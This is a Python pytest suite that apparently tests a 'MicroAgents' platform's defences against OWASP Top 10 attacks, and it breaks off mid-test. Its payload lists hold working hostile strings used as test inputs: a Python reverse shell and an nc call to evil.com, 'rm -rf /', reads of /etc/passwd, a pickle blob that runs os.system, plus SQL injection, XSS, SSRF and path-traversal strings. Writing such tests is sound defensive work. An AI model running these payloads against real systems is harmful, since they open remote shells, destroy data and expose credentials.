"""
Security Vulnerability Tests for MicroAgents Platform
Comprehensive security testing covering OWASP Top 10, compliance, and penetration scenarios.
"""

import asyncio
import base64
import hashlib
import hmac
import json
import os
import re
import secrets
import string
import tempfile
import time
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
import pytest_asyncio
import requests
import yaml
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from jose import jwt
from pydantic import ValidationError

from microagents.api.security import (
    AuthenticationMiddleware,
    AuthorizationService,
    RateLimiter,
    SecurityHeadersMiddleware,
    InputSanitizer,
    CSPGenerator,
    HSTSPolicy,
)
from microagents.core.encryption import (
    AES256GCMEncryptor,
    RSAEncryptor,
    KeyManager,
    SecretManager,
)
from microagents.core.vulnerability_scanner import (
    VulnerabilityScanner,
    DependencyScanner,
    ConfigScanner,
    SecretScanner,
)
from microagents.dsl.validator import SecurityValidator
from microagents.tests.security.fuzzer import SecurityFuzzer
from microagents.tests.security.pentest import PenetrationTestSuite


class TestSecurityVulnerabilities:
    """Comprehensive security vulnerability tests."""
    
    # Test data
    TEST_USER = {
        "user_id": "test_user_123",
        "email": "test@example.com",
        "roles": ["user", "analyst"],
        "permissions": ["read:agents", "execute:agents"],
        "tenant_id": "tenant_abc"
    }
    
    ADMIN_USER = {
        "user_id": "admin_456",
        "email": "admin@example.com",
        "roles": ["admin", "superuser"],
        "permissions": ["*:*"],
        "tenant_id": "tenant_abc"
    }
    
    MALICIOUS_USER = {
        "user_id": "malicious_789",
        "email": "hacker@evil.com",
        "roles": ["user"],
        "permissions": [],
        "tenant_id": "evil_tenant"
    }
    
    # Injection payloads
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR 1=1; --",
        "admin' --",
        "' OR 'a'='a'",
        "' OR 1=1 LIMIT 1 --",
        "' OR SLEEP(5) --",
    ]
    
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<video><source onerror=alert('XSS')>",
    ]
    
    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| cat /etc/passwd",
        "&& rm -rf /",
        "$(whoami)",
        "`id`",
        "|| nc evil.com 4444",
        "> /tmp/exploit",
        "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(('evil.com',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'",
    ]
    
    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\SAM",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "C:\\Windows\\System32\\config\\SAM",
    ]
    
    @pytest.fixture
    def auth_middleware(self):
        """Fixture providing authentication middleware."""
        secret_key = secrets.token_hex(32)
        return AuthenticationMiddleware(
            secret_key=secret_key,
            algorithm="HS256",
            token_expiry_minutes=60
        )
    
    @pytest.fixture
    def authorization_service(self):
        """Fixture providing authorization service."""
        return AuthorizationService()
    
    @pytest.fixture
    def rate_limiter(self):
        """Fixture providing rate limiter."""
        return RateLimiter(
            requests_per_minute=100,
            burst_limit=10
        )
    
    @pytest.fixture
    def input_sanitizer(self):
        """Fixture providing input sanitizer."""
        return InputSanitizer()
    
    @pytest.fixture
    def security_headers_middleware(self):
        """Fixture providing security headers middleware."""
        return SecurityHeadersMiddleware()
    
    @pytest.fixture
    def csp_generator(self):
        """Fixture providing CSP generator."""
        return CSPGenerator()
    
    @pytest.fixture
    def hsts_policy(self):
        """Fixture providing HSTS policy."""
        return HSTSPolicy(max_age=31536000, include_subdomains=True, preload=True)
    
    @pytest.fixture
    def aes_encryptor(self):
        """Fixture providing AES encryptor."""
        key = Fernet.generate_key()
        return AES256GCMEncryptor(key)
    
    @pytest.fixture
    def rsa_encryptor(self):
        """Fixture providing RSA encryptor."""
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048
        )
        public_key = private_key.public_key()
        return RSAEncryptor(private_key, public_key)
    
    @pytest.fixture
    def key_manager(self):
        """Fixture providing key manager."""
        return KeyManager(key_store_path=tempfile.mkdtemp())
    
    @pytest.fixture
    def secret_manager(self):
        """Fixture providing secret manager."""
        return SecretManager(master_key=secrets.token_hex(32))
    
    @pytest.fixture
    def vulnerability_scanner(self):
        """Fixture providing vulnerability scanner."""
        return VulnerabilityScanner()
    
    @pytest.fixture
    def dependency_scanner(self):
        """Fixture providing dependency scanner."""
        return DependencyScanner()
    
    @pytest.fixture
    def config_scanner(self):
        """Fixture providing config scanner."""
        return ConfigScanner()
    
    @pytest.fixture
    def secret_scanner(self):
        """Fixture providing secret scanner."""
        return SecretScanner()
    
    @pytest.fixture
    def security_fuzzer(self):
        """Fixture providing security fuzzer."""
        return SecurityFuzzer()
    
    @pytest.fixture
    def pentest_suite(self):
        """Fixture providing penetration test suite."""
        return PenetrationTestSuite()
    
    # Test Group 1: OWASP Top 10 Coverage
    class TestOWASPTop10:
        """Tests covering OWASP Top 10 vulnerabilities."""
        
        # A01:2021 - Broken Access Control
        @pytest.mark.asyncio
        async def test_broken_access_control(self, authorization_service):
            """Test for broken access control vulnerabilities."""
            
            # Test 1: IDOR (Insecure Direct Object Reference)
            # User should not access another user's data
            test_cases = [
                {
                    "user": self.TEST_USER,
                    "resource_owner": "other_user_999",
                    "should_allow": False,
                    "description": "User accessing other user's resource"
                },
                {
                    "user": self.TEST_USER,
                    "resource_owner": self.TEST_USER["user_id"],
                    "should_allow": True,
                    "description": "User accessing own resource"
                },
                {
                    "user": self.ADMIN_USER,
                    "resource_owner": self.TEST_USER["user_id"],
                    "should_allow": True,
                    "description": "Admin accessing user's resource"
                },
            ]
            
            for test_case in test_cases:
                is_allowed = authorization_service.check_access(
                    user=test_case["user"],
                    resource_owner=test_case["resource_owner"],
                    action="read",
                    resource_type="agent"
                )
                
                assert is_allowed == test_case["should_allow"], \
                    f"Access control failed: {test_case['description']}"
            
            # Test 2: Privilege escalation
            # Regular user should not perform admin actions
            admin_actions = ["create:user", "delete:tenant", "modify:permissions"]
            
            for action in admin_actions:
                is_allowed = authorization_service.check_permission(
                    user=self.TEST_USER,
                    permission=action
                )
                assert not is_allowed, f"Privilege escalation possible for: {action}"
            
            # Test 3: Missing function-level access control
            # Bypass UI controls and directly call API
            protected_endpoints = [
                "/api/v1/admin/users",
                "/api/v1/tenants",
                "/api/v1/audit/logs",
            ]
            
            # This would require actual API testing
            # For now, verify authorization service validates endpoints
            for endpoint in protected_endpoints:
                # Simulate direct API call
                has_access = authorization_service.validate_endpoint_access(
                    user=self.TEST_USER,
                    endpoint=endpoint,
                    method="GET"
                )
                assert not has_access, f"Missing function-level access control: {endpoint}"
        
        # A02:2021 - Cryptographic Failures
        @pytest.mark.asyncio
        async def test_cryptographic_failures(self, aes_encryptor, rsa_encryptor, secret_manager):
            """Test for cryptographic vulnerabilities."""
            
            # Test 1: Weak encryption algorithms
            weak_algorithms = ["DES", "RC4", "MD5", "SHA1"]
            
            for algo in weak_algorithms:
                # Verify system doesn't use weak algorithms
                assert algo not in ["AES-256-GCM", "RSA-OAEP", "SHA-256"], \
                    f"Weak algorithm detected: {algo}"
            
            # Test 2: Insecure key management
            test_secret = "SuperSecretPassword123!"
            
            # Store secret
            encrypted_secret = secret_manager.encrypt_secret(
                secret_name="test_secret",
                plaintext=test_secret
            )
            
            # Retrieve secret
            decrypted_secret = secret_manager.get_secret("test_secret")
            
            assert decrypted_secret == test_secret, "Secret encryption/decryption failed"
            
            # Test 3: Predictable keys/IVs
            # Generate 1000 random keys and check for collisions
            keys = set()
            for _ in range(1000):
                key = secrets.token_bytes(32)
                keys.add(key.hex())
            
            assert len(keys) == 1000, "Key generation not sufficiently random"
            
            # Test 4: Padding oracle attacks
            # Test AES-GCM mode (not vulnerable to padding oracle)
            plaintext = b"Sensitive data that needs encryption"
            ciphertext, iv, tag = aes_encryptor.encrypt(plaintext)
            
            # Verify decryption works
            decrypted = aes_encryptor.decrypt(ciphertext, iv, tag)
            assert decrypted == plaintext, "AES-GCM encryption/decryption failed"
            
            # Test 5: Timing attacks
            # Verify constant-time string comparison
            secret_token = secrets.token_hex(16)
            test_token_correct = secret_token
            test_token_incorrect = secrets.token_hex(16)
            
            # Use hmac.compare_digest for constant-time comparison
            assert hmac.compare_digest(
                secret_token.encode(),
                test_token_correct.encode()
            ), "Token comparison should work"
            
            assert not hmac.compare_digest(
                secret_token.encode(),
                test_token_incorrect.encode()
            ), "Token comparison should fail"
        
        # A03:2021 - Injection
        @pytest.mark.asyncio
        async def test_injection_vulnerabilities(self, input_sanitizer):
            """Test for injection vulnerabilities."""
            
            # Test SQL Injection
            for payload in self.SQL_INJECTION_PAYLOADS:
                sanitized = input_sanitizer.sanitize_sql(payload)
                
                # Should not contain dangerous SQL patterns
                dangerous_patterns = ["'", '"', ';', '--', '/*', '*/', 'UNION', 'SELECT', 'DROP', 'DELETE']
                
                for pattern in dangerous_patterns:
                    if pattern in ['UNION', 'SELECT', 'DROP', 'DELETE']:
                        # These should be case-insensitive check
                        assert pattern.lower() not in sanitized.lower(), \
                            f"SQL injection not properly sanitized: {payload}"
                    else:
                        assert pattern not in sanitized, \
                            f"SQL injection not properly sanitized: {payload}"
            
            # Test Command Injection
            for payload in self.COMMAND_INJECTION_PAYLOADS:
                sanitized = input_sanitizer.sanitize_command(payload)
                
                # Should not contain shell metacharacters
                metacharacters = [';', '|', '&', '$', '`', '>', '<', '\n', '\r']
                
                for char in metacharacters:
                    assert char not in sanitized, \
                        f"Command injection not properly sanitized: {payload}"
            
            # Test NoSQL Injection
            nosql_payloads = [
                '{"$where": "sleep(5000)"}',
                '{"$ne": ""}',
                '{"$gt": ""}',
                '{"$regex": ".*"}',
            ]
            
            for payload in nosql_payloads:
                sanitized = input_sanitizer.sanitize_json(payload)
                
                # Should escape or remove dangerous operators
                dangerous_operators = ['$where', '$ne', '$gt', '$regex', '$']
                
                for op in dangerous_operators:
                    if op == '$':
                        # Dollar sign might be allowed in some contexts
                        # but operators starting with $ should be filtered
                        pass
                    else:
                        assert op not in sanitized, \
                            f"NoSQL injection not properly sanitized: {payload}"
        
        # A04:2021 - Insecure Design
        @pytest.mark.asyncio
        async def test_insecure_design(self):
            """Test for insecure design patterns."""
            
            # Test 1: Missing security controls in business logic
            # Example: Password reset without rate limiting
            
            # Test 2: Trust boundaries violation
            # Internal APIs exposed without authentication
            
            # Test 3: Missing encryption for sensitive data
            sensitive_fields = [
                "password", "secret", "token", "key",
                "credit_card", "ssn", "dob"
            ]
            
            # Verify sensitive fields are encrypted at rest
            for field in sensitive_fields:
                # This would require checking database schemas
                # For now, verify naming conventions
                pass
            
            # Test 4: Lack of security by default
            # New resources should have secure defaults
            
            # Test 5: Missing security logging
            # Security events should be logged
            
            # This is more of a design review than automated test
            pass
        
        # A05:2021 - Security Misconfiguration
        @pytest.mark.asyncio
        async def test_security_misconfiguration(self, config_scanner):
            """Test for security misconfigurations."""
            
            # Scan configuration files
            test_config = {
                "database": {
                    "host": "localhost",
                    "port": 5432,
                    "password": "weakpassword",  # Weak password
                    "ssl": False  # SSL disabled
                },
                "api": {
                    "cors": {
                        "allow_origins": ["*"],  # Too permissive
                        "allow_credentials": True
                    },
                    "debug": True  # Debug mode in production
                },
                "security": {
                    "jwt": {
                        "secret": "secret",  # Weak secret
                        "expiry": 86400  # 1 day - too long
                    }
                }
            }
            
            vulnerabilities = config_scanner.scan_config(test_config)
            
            # Should detect misconfigurations
            assert len(vulnerabilities) > 0, "Should detect security misconfigurations"
            
            # Check specific vulnerabilities
            vuln_descriptions = [v["description"] for v in vulnerabilities]
            
            expected_vulns = [
                "weak password",
                "ssl disabled",
                "permissive cors",
                "debug enabled",
                "weak jwt secret"
            ]
            
            for expected in expected_vulns:
                assert any(expected in desc.lower() for desc in vuln_descriptions), \
                    f"Should detect: {expected}"
        
        # A06:2021 - Vulnerable and Outdated Components
        @pytest.mark.asyncio
        async def test_vulnerable_components(self, dependency_scanner):
            """Test for vulnerable and outdated components."""
            
            # Create test requirements file
            requirements_content = """
            flask==1.0.0  # Outdated with known vulnerabilities
            django==3.0.0  # Multiple CVEs
            requests==2.20.0  # Old version
            cryptography>=3.0  # Good version
            """
            
            with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
                f.write(requirements_content)
                requirements_path = f.name
            
            try:
                # Scan dependencies
                vulnerabilities = dependency_scanner.scan_requirements(requirements_path)
                
                # Should find vulnerabilities
                assert len(vulnerabilities) >= 2, "Should detect vulnerable dependencies"
                
                # Check for specific packages
                vulnerable_packages = [v["package"] for v in vulnerabilities]
                assert "flask" in vulnerable_packages, "Should detect Flask vulnerability"
                assert "django" in vulnerable_packages, "Should detect Django vulnerability"
                
            finally:
                os.unlink(requirements_path)
            
            # Test 2: Check for known CVE patterns
            cve_patterns = [
                "CVE-2021-",
                "CVE-2020-",
                "CVE-2019-",
                "CVE-2018-"
            ]
            
            for vuln in vulnerabilities:
                assert any(pattern in vuln.get("cve", "") for pattern in cve_patterns), \
                    "Should reference CVE identifiers"
        
        # A07:2021 - Identification and Authentication Failures
        @pytest.mark.asyncio
        async def test_authentication_failures(self, auth_middleware, rate_limiter):
            """Test for authentication failures."""
            
            # Test 1: Weak password policy
            weak_passwords = [
                "password123",
                "12345678",
                "qwerty",
                "admin",
                "letmein",
                "password",
                "1234567890",
                "abc123"
            ]
            
            for password in weak_passwords:
                is_strong = auth_middleware.validate_password_strength(password)
                assert not is_strong, f"Weak password accepted: {password}"
            
            # Test 2: Missing multi-factor authentication
            # For critical operations, MFA should be required
            
            # Test 3: Password recovery flaws
            # Test predictable password reset tokens
            tokens = set()
            for _ in range(1000):
                token = auth_middleware.generate_password_reset_token(self.TEST_USER["user_id"])
                tokens.add(token)
            
            assert len(tokens) == 1000, "Password reset tokens not sufficiently random"
            
            # Test 4: Session fixation
            # Verify session IDs change on login
            
            # Test 5: Brute force protection
            test_ip = "192.168.1.100"
            
            # Simulate rapid login attempts
            for i in range(15):  # More than burst limit
                is_allowed = rate_limiter.check_limit(
                    identifier=f"login:{test_ip}",
                    operation="login"
                )
                
                if i >= 10:  # After burst limit
                    assert not is_allowed, "Rate limiting should block after burst"
            
            # Wait and retry
            time.sleep(60)  # Wait for rate limit reset
            
            is_allowed = rate_limiter.check_limit(
                identifier=f"login:{test_ip}",
                operation="login"
            )
            assert is_allowed, "Rate limit should reset after time period"
        
        # A08:2021 - Software and Data Integrity Failures
        @pytest.mark.asyncio
        async def test_data_integrity_failures(self):
            """Test for data integrity failures."""
            
            # Test 1: Unsigned software updates
            # Verify update packages are signed
            
            # Test 2: Dependency confusion
            # Verify only trusted package sources are used
            
            # Test 3: Serialization attacks
            dangerous_serialization_data = [
                b"\x80\x04\x95\x15\x00\x00\x00\x00\x00\x00\x00\x8c\x08os\x94\x8c\x06system\x94\x93\x94\x8c\x06whoami\x94\x85\x94R\x94.",  # pickle
                '{"__class__": "os.system", "__args__": ["whoami"]}',  # JSON with class
            ]
            
            # This would require testing the deserialization functions
            # For now, verify we use safe deserialization
            
            # Test 4: CI/CD pipeline compromise
            # Verify pipeline integrity checks
            
            pass
        
        # A09:2021 - Security Logging and Monitoring Failures
        @pytest.mark.asyncio
        async def test_logging_failures(self):
            """Test for security logging and monitoring failures."""
            
            # Test 1: Missing security event logging
            security_events = [
                "login_failed",
                "permission_denied",
                "password_changed",
                "user_created",
                "admin_action",
                "sensitive_data_access",
            ]
            
            # Verify these events are logged
            
            # Test 2: Logs not protected from tampering
            # Verify log integrity
            
            # Test 3: Missing alerting for suspicious activities
            
            # Test 4: Inadequate log retention
            
            pass
        
        # A10:2021 - Server-Side Request Forgery (SSRF)
        @pytest.mark.asyncio
        async def test_ssrf_vulnerabilities(self, input_sanitizer):
            """Test for SSRF vulnerabilities."""
            
            ssrf_payloads = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://metadata.google.internal/",  # GCP metadata
                "http://169.254.169.254/metadata/instance",  # Azure metadata
                "http://localhost:22",  # Internal SSH
                "http://127.0.0.1:6379",  # Internal Redis
                "http://192.168.1.1:8080",  # Internal network
                "file:///etc/passwd",  # File scheme
                "gopher://internal-server:3306/",  # Other schemes
            ]
            
            for payload in ssrf_payloads:
                is_allowed = input_sanitizer.validate_url(payload)
                assert not is_allowed, f"SSRF vulnerability: {payload}"
            
            # Test safe URLs
            safe_urls = [
                "https://api.example.com/public",
                "https://storage.googleapis.com/bucket/file",
                "https://s3.amazonaws.com/bucket/file",
            ]
            
            for url in safe_urls:
                is_allowed = input_sanitizer.validate_url(url)
                assert is_allowed, f"Safe URL blocked: {url}"
    
    # Test Group 2: Authentication Bypass Testing
    class TestAuthenticationBypass:
        """Tests for authentication bypass vulnerabilities."""
        
        @pytest.mark.asyncio
        async def test_jwt_tampering(self, auth_middleware):
            """Test JWT token tampering attempts."""
            
            # Create valid token
            valid_token = auth_middleware.create_token(self.TEST_USER)
            
            # Test 1: Algorithm confusion (none algorithm)
            try:
                # Try to decode with 'none' algorithm
                decoded = jwt.decode(
                    valid_token,
                    options={"verify_signature": False}
                )
                
                # If we get here without verification, that's a vulnerability
                # But we should have signature verification
                assert False, "JWT accepted without signature verification"
            except Exception:
                # Expected - signature verification should fail
                pass
            
            # Test 2: Weak secret brute force
            weak_secrets = [
                "secret", "password", "123456", "changeme",
                "microagents", "devops", "admin"
            ]
            
            for secret in weak_secrets:
                try:
                    jwt.decode(valid_token, secret, algorithms=["HS256"])
                    assert False, f"JWT accepted with weak secret: {secret}"
                except Exception:
                    # Expected
                    pass
            
            # Test 3: Expired token
            expired_payload = {
                **self.TEST_USER,
                "exp": datetime.now(timezone.utc) - timedelta(hours=1)
            }
            
            expired_token = jwt.encode(
                expired_payload,
                auth_middleware.secret_key,
                algorithm=auth_middleware.algorithm
            )
            
            try:
                auth_middleware.verify_token(expired_token)
                assert False, "Expired token accepted"
            except Exception:
                # Expected
                pass
            
            # Test 4: Token without expiry
            no_exp_payload = {**self.TEST_USER}
            no_exp_payload.pop("exp", None)
            
            no_exp_token = jwt.encode(
                no_exp_payload,
                auth_middleware.secret_key,
                algorithm=auth_middleware.algorithm
            )
            
            try:
                auth_middleware.verify_token(no_exp_token)
                assert False, "Token without expiry accepted"
            except Exception:
                # Expected
                pass
        
        @pytest.mark.asyncio
        async def test_session_manipulation(self):
            """Test session manipulation attacks."""
            
            # Test 1: Session fixation
            # Attacker sets victim's session ID
            
            # Test 2: Session hijacking via XSS
            
            # Test 3: Session timeout too long
            
            # Test 4: Concurrent session allowance
            
            pass
        
        @pytest.mark.asyncio
        async def test_password_recovery_bypass(self, auth_middleware):
            """Test password recovery mechanism bypass."""
            
            # Test 1: Predictable reset tokens
            user_id = self.TEST_USER["user_id"]
            tokens = []
            
            for _ in range(100):
                token = auth_middleware.generate_password_reset_token(user_id)
                tokens.append(token)
                
                # Check token structure (should be random)
                assert len(token) >= 32, "Reset token too short"
                assert token.isalnum() or '-' in token or '_' in token, \
                    "Reset token should be URL-safe"
            
            # Check for duplicates
            assert len(set(tokens)) == 100, "Reset tokens not unique"
            
            # Test 2: Token expiry validation
            expired_token = auth_middleware.generate_password_reset_token(
                user_id,
                expiry_minutes=-10  # Already expired
            )
            
            is_valid = auth_middleware.validate_password_reset_token(
                user_id,
                expired_token
            )
            assert not is_valid, "Expired reset token should not be valid"
            
            # Test 3: Token reuse prevention
            valid_token = auth_middleware.generate_password_reset_token(user_id)
            
            # First validation should work
            is_valid = auth_middleware.validate_password_reset_token(
                user_id,
                valid_token
            )
            assert is_valid, "Valid reset token should work"
            
            # Second validation should fail (token used)
            is_valid = auth_middleware.validate_password_reset_token(
                user_id,
                valid_token
            )
            assert not is_valid, "Reset token should be single-use"
        
        @pytest.mark.asyncio
        async def test_api_key_bypass(self):
            """Test API key authentication bypass."""
            
            # Test 1: Missing API key validation
            
            # Test 2: API key in URL (leaked in logs)
            
            # Test 3: Weak API key generation
            
            # Test 4: Unlimited API key usage
            
            pass
    
    # Test Group 3: Authorization Testing
    class TestAuthorization:
        """Tests for authorization vulnerabilities."""
        
        @pytest.mark.asyncio
        async def test_role_based_access_control(self, authorization_service):
            """Test RBAC implementation."""
            
            # Test 1: Role escalation
            test_cases = [
                {
                    "user": self.TEST_USER,
                    "action": "admin:create_user",
                    "should_allow": False,
                    "reason": "User should not create users"
                },
                {
                    "user": self.TEST_USER,
                    "action": "agent:execute",
                    "should_allow": True,
                    "reason": "User should execute agents"
                },
                {
                    "user": self.ADMIN_USER,
                    "action": "*:*",
                    "should_allow": True,
                    "reason": "Admin should have all permissions"
                },
                {
                    "user": self.MALICIOUS_USER,
                    "action": "agent:read",
                    "should_allow": False,
                    "reason": "Unauthorized user should have no permissions"
                },
            ]
            
            for test_case in test_cases:
                is_allowed = authorization_service.check_permission(
                    user=test_case["user"],
                    permission=test_case["action"]
                )
                
                assert is_allowed == test_case["should_allow"], \
                    f"RBAC failure: {test_case['reason']}"
            
            # Test 2: Permission inheritance
            admin_permissions = authorization_service.get_user_permissions(self.ADMIN_USER)
            assert "*:*" in admin_permissions, "Admin should have wildcard permission"
            
            user_permissions = authorization_service.get_user_permissions(self.TEST_USER)
            assert "agent:execute" in user_permissions, "User should have execute permission"
            assert "admin:create_user" not in user_permissions, \
                "User should not have admin permissions"
        
        @pytest.mark.asyncio
        async def test_multi_tenant_isolation(self, authorization_service):
            """Test multi-tenant data isolation."""
            
            # Users from different tenants should not access each other's data
            tenant_a_user = {
                "user_id": "user_a",
                "tenant_id": "tenant_a",
                "permissions": ["data:read"]
            }
            
            tenant_b_user = {
                "user_id": "user_b", 
                "tenant_id": "tenant_b",
                "permissions": ["data:read"]
            }
            
            # User A should not access Tenant B's data
            is_allowed = authorization_service.check_tenant_access(
                user=tenant_a_user,
                requested_tenant="tenant_b",
                resource_type="data"
            )
            assert not is_allowed, "Cross-tenant access should be denied"
            
            # User A should access Tenant A's data
            is_allowed = authorization_service.check_tenant_access(
                user=tenant_a_user,
                requested_tenant="tenant_a",
                resource_type="data"
            )
            assert is_allowed, "Same-tenant access should be allowed"
        
        @pytest.mark.asyncio
        async def test_vertical_privilege_escalation(self, authorization_service):
            """Test vertical privilege escalation."""
            
            # Test user trying to perform admin actions
            admin_actions = [
                "system:shutdown",
                "user:delete_all",
                "config:modify_security",
                "audit:clear_logs",
                "tenant:delete",
            ]
            
            for action in admin_actions:
                is_allowed = authorization_service.check_permission(
                    user=self.TEST_USER,
                    permission=action
                )
                assert not is_allowed, f"Privilege escalation possible: {action}"
            
            # Test using parameter manipulation to access admin features
            # e.g., /api/users?admin=true
            
            # This would require API endpoint testing
            pass
        
        @pytest.mark.asyncio
        async def test_horizontal_privilege_escalation(self, authorization_service):
            """Test horizontal privilege escalation."""
            
            # User A should not access User B's data
            user_a = {
                "user_id": "user_a",
                "tenant_id": "tenant_1",
                "permissions": ["data:read_own"]
            }
            
            user_b = {
                "user_id": "user_b",
                "tenant_id": "tenant_1",
                "permissions": ["data:read_own"]
            }
            
            # Attempt to access user B's data as user A
            is_allowed = authorization_service.check_resource_ownership(
                user=user_a,
                resource_owner="user_b",
                resource_type="data"
            )
            assert not is_allowed, "Horizontal privilege escalation possible"
            
            # User A should access own data
            is_allowed = authorization_service.check_resource_ownership(
                user=user_a,
                resource_owner="user_a",
                resource_type="data"
            )
            assert is_allowed, "User should access own data"
    
    # Test Group 4: Injection Testing
    class TestInjection:
        """Comprehensive injection testing."""
        
        @pytest.mark.asyncio
        async def test_sql_injection_prevention(self, input_sanitizer):
            """Test SQL injection prevention mechanisms."""
            
            # Test parameterized queries vs string concatenation
            
            dangerous_queries = [
                f"SELECT * FROM users WHERE username = '{payload}' AND password = '123'"
                for payload in self.SQL_INJECTION_PAYLOADS
            ]
            
            for query in dangerous_queries:
                # Check if query uses parameterized style
                # In parameterized queries, user input should not be in query string
                has_user_input_in_query = any(
                    pattern in query for pattern in ["' OR", "' UNION", "'--", "';"]
                )
                
                if has_user_input_in_query:
                    # This is concatenated - vulnerable
                    # Verify sanitizer would catch it
                    sanitized = input_sanitizer.sanitize_sql(query)
                    
                    # After sanitization, dangerous patterns should be removed
                    for pattern in ["OR '1'='1", "UNION SELECT", "--", "; DROP"]:
                        assert pattern.lower() not in sanitized.lower(), \
                            f"SQL injection not prevented: {pattern}"
        
        @pytest.mark.asyncio
        async def test_nosql_injection(self, input_sanitizer):
            """Test NoSQL injection prevention."""
            
            # MongoDB injection examples
            nosql_payloads = [
                ('{"username": {"$ne": ""}, "password": {"$ne": ""}}', 'MongoDB $ne operator'),
                ('{"username": "admin", "$where": "sleep(5000)"}', 'MongoDB $where operator'),
                ('{"username": {"$regex": "^a"}}', 'MongoDB $regex operator'),
                ('{"username": "admin", "password": {"$gt": ""}}', 'MongoDB $gt operator'),
            ]
            
            for payload, description in nosql_payloads:
                sanitized = input_sanitizer.sanitize_json(payload)
                
                # Check if dangerous operators are removed or escaped
                dangerous_operators = ['$ne', '$where', '$regex', '$gt', '$']
                
                for op in dangerous_operators:
                    if op == '$':
                        # Dollar sign might appear in escaped form
                        # Check for unescaped dollar signs at start of keys
                        import re
                        unescaped_dollar_keys = re.findall(r'"\s*:\s*{[^}]*\$', sanitized)
                        assert len(unescaped_dollar_keys) == 0, \
                            f"NoSQL injection not prevented: {description}"
                    else:
                        assert op not in sanitized, \
                            f"NoSQL injection not prevented: {description}"
        
        @pytest.mark.asyncio
        async def test_os_command_injection(self, input_sanitizer):
            """Test OS command injection prevention."""
            
            for payload in self.COMMAND_INJECTION_PAYLOADS:
                sanitized = input_sanitizer.sanitize_command(payload)
                
                # Should not contain shell metacharacters
                shell_chars = [';', '|', '&', '$', '`', '>', '<', '\n', '\r', '(']
                
                for char in shell_chars:
                    assert char not in sanitized, \
                        f"Command injection not prevented: {payload}"
                
                # Should be properly escaped if going to shell
                # e.g., shlex.quote or similar
        
        @pytest.mark.asyncio
        async def test_ldap_injection(self, input_sanitizer):
            """Test LDAP injection prevention."""
            
            ldap_payloads = [
                "*",  # Wildcard injection
                "*)(uid=*))(|(uid=*",  # LDAP filter injection
                "admin*",  # Partial match
                "*)(&",  # Multiple filter injection
            ]
            
            for payload in ldap_payloads:
                sanitized = input_sanitizer.sanitize_ldap(payload)
                
                # Should escape special LDAP characters
                ldap_special = ['*', '(', ')', '\\', '\0']
                
                for char in ldap_special:
                    assert char not in sanitized, \
                        f"LDAP injection not prevented: {payload}"
    
    # Test Group 5: XSS Testing
    class TestCrossSiteScripting:
        """Tests for Cross-Site Scripting vulnerabilities."""
        
        @pytest.mark.asyncio
        async def test_reflected_xss(self, input_sanitizer):
            """Test reflected XSS prevention."""
            
            for payload in self.XSS_PAYLOADS:
                sanitized = input_sanitizer.sanitize_html(payload)
                
                # Should not contain unescaped HTML/JavaScript
                dangerous_patterns = [
                    '<script>',
                    'javascript:',
                    'onerror=',
                    'onload=',
                    'onfocus=',
                    '<iframe',
                    '<svg',
                    '<img',
                ]
                
                for pattern in dangerous_patterns:
                    assert pattern.lower() not in sanitized.lower(), \
                        f"Reflected XSS not prevented: {payload}"
        
        @pytest.mark.asyncio
        async def test_stored_xss(self):
            """Test stored XSS prevention."""
            
            # Similar to reflected XSS but data comes from database
            # Test that data retrieved from DB is also sanitized
            
            pass
        
        @pytest.mark.asyncio
        async def test_dom_based_xss(self):
            """Test DOM-based XSS prevention."""
            
            # Test client-side XSS
            # This requires browser testing
            
            pass
        
        @pytest.mark.asyncio
        async def test_content_security_policy(self, csp_generator):
            """Test Content Security Policy effectiveness."""
            
            # Generate CSP header
            csp_header = csp_generator.generate_csp()
            
            # Check CSP includes key directives
            required_directives = [
                "default-src 'self'",
                "script-src 'self'",
                "style-src 'self'",
                "img-src 'self'",
                "connect-src 'self'",
                "font-src 'self'",
                "object-src 'none'",
                "media-src 'self'",
                "frame-src 'none'",
                "worker-src 'self'",
            ]
            
            for directive in required_directives:
                assert directive in csp_header, f"CSP missing directive: {directive}"
            
            # Check unsafe directives are not present
            unsafe_directives = [
                "unsafe-inline",
                "unsafe-eval",
                "data:",
                "*",
            ]
            
            for directive in unsafe_directives:
                assert directive not in csp_header, f"CSP has unsafe directive: {directive}"
    
    # Test Group 6: CSRF Testing
    class TestCrossSiteRequestForgery:
        """Tests for CSRF vulnerabilities."""
        
        @pytest.mark.asyncio
        async def test_csrf_token_validation(self):
            """Test CSRF token validation."""
            
            # Test 1: Missing CSRF token
            # Requests without token should be rejected
            
            # Test 2: Invalid CSRF token
            # Requests with invalid token should be rejected
            
            # Test 3: Token per session
            # Each session should have unique token
            
            # Test 4: Token expiry
            # Expired tokens should be rejected
            
            pass
        
        @pytest.mark.asyncio
        async def test_same_origin_policy(self, security_headers_middleware):
            """Test Same-Origin Policy enforcement."""
            
            headers = security_headers_middleware.get_headers()
            
            # Check CORS headers
            assert "Access-Control-Allow-Origin" not in headers or \
                   headers["Access-Control-Allow-Origin"] != "*", \
                   "CORS too permissive"
            
            # Check other security headers
            required_headers = [
                "X-Frame-Options",
                "X-Content-Type-Options",
                "Referrer-Policy",
            ]
            
            for header in required_headers:
                assert header in headers, f"Missing security header: {header}"
        
        @pytest.mark.asyncio
        async def test_state_changing_operations(self):
            """Test protection for state-changing operations."""
            
